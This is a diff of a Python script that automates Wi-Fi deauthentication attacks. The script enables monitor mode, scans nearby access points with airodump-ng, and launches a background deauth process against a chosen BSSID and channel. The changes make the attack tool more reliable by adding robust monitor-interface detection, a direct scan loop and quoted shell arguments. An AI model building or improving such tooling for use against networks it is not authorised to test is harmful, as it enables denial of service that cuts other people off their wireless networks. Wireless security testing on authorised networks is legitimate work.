@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import subprocess, os, sys, time, re, psutil
+import subprocess, os, sys, time, re, shlex, psutil
 from datetime import datetime
 from termcolor import colored
 
@@ -13,6 +13,8 @@ PID_FILE = os.path.join(SESSION_DIR, "deauth.pid")
 CLIENT_LOG = os.path.join(SESSION_DIR, "clients.log")
 IFACE = ""
 MONITOR_IFACE = ""
+APP_DIR = os.path.dirname(os.path.abspath(__file__))
+BACKGROUND_SCRIPT = os.path.join(APP_DIR, "background_deauth.py")
 
 # === VISUALS ===
 def banner():
@@ -36,11 +38,33 @@ def detect_iface():
     IFACE = match.group(1) if match else "wlan0"
     success(f"Interface selected: {IFACE}")
 
+def get_monitor_interfaces():
+    """Return interfaces that the kernel currently reports as monitor mode."""
+    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
+    monitors = []
+    for block in re.finditer(r"Interface\s+(\S+)(.*?)(?=\n\s*Interface\s+|\Z)", result.stdout, re.S):
+        if re.search(r"^\s*type\s+monitor\s*$", block.group(2), re.M):
+            monitors.append(block.group(1))
+    return monitors
+
 def start_monitor():
     global MONITOR_IFACE
-    subprocess.run(["airmon-ng", "start", IFACE], stdout=subprocess.DEVNULL)
-    MONITOR_IFACE = IFACE + "mon"
+    result = subprocess.run(["airmon-ng", "start", IFACE], capture_output=True, text=True)
+    if result.returncode != 0:
+        error("Could not enable monitor mode.")
+        print(result.stderr or result.stdout)
+        return False
+
+    monitors = get_monitor_interfaces()
+    if not monitors:
+        error("No monitor-mode interface was created. Check that the adapter supports monitor mode.")
+        print(result.stdout)
+        return False
+
+    # Airmon-ng may retain the original interface name or use a different suffix.
+    MONITOR_IFACE = next((name for name in monitors if name.startswith(IFACE)), monitors[0])
     success(f"Monitor mode enabled on {MONITOR_IFACE}")
+    return True
 
 def stop_monitor():
     subprocess.run(["airmon-ng", "stop", MONITOR_IFACE], stdout=subprocess.DEVNULL)
@@ -49,11 +73,15 @@ def stop_monitor():
 
 # === AIRODUMP ===
 def scan_aps():
-    status("Opening GNOME terminal to scan nearby APs...")
-    cmd = f"sudo airodump-ng -w {TMP_PREFIX} --output-format csv {MONITOR_IFACE}"
-    gnome_cmd = f"sudo -u \"$(logname)\" gnome-terminal -- bash -c \"{cmd}; exec bash\""
-    os.system(gnome_cmd)
-    input(colored("\n[Enter] when ready to continue: ", "green"))
+    status("Scanning nearby APs. Press Ctrl+C when you are ready to select one.")
+    try:
+        subprocess.run([
+            "airodump-ng", "-w", TMP_PREFIX, "--output-format", "csv", MONITOR_IFACE
+        ])
+    except KeyboardInterrupt:
+        # airodump-ng writes its CSV files when it receives Ctrl+C.
+        print()
+        status("Scan stopped. Reading results...", "[*]", "yellow")
 
 def parse_csv():
     aps = []
@@ -92,7 +120,11 @@ def start_deauth(bssid, channel):
     open(CLIENT_LOG, 'a').close()
     
     log_file = os.path.join(SESSION_DIR, "deauth.log")
-    cmd = f"nohup python3 background_deauth.py {MONITOR_IFACE} {bssid} {channel} {CLIENT_LOG} > {log_file} 2>&1 & echo $! > {PID_FILE}"
+    cmd = (
+        f"nohup python3 {shlex.quote(BACKGROUND_SCRIPT)} {shlex.quote(MONITOR_IFACE)} "
+        f"{shlex.quote(bssid)} {shlex.quote(channel)} {shlex.quote(CLIENT_LOG)} "
+        f"> {shlex.quote(log_file)} 2>&1 & echo $! > {shlex.quote(PID_FILE)}"
+    )
     os.system(cmd)
     success("Deauth started in background.")
     status(f"BSSID: {bssid} | Channel: {channel}")
@@ -134,7 +166,8 @@ def view_status():
 def main():
     banner()
     detect_iface()
-    start_monitor()
+    if not start_monitor():
+        return
     while True:
         line()
         print(colored("[1] Start Deauth   [2] Stop Deauth   [3] View Status   [4] Exit", "cyan"))
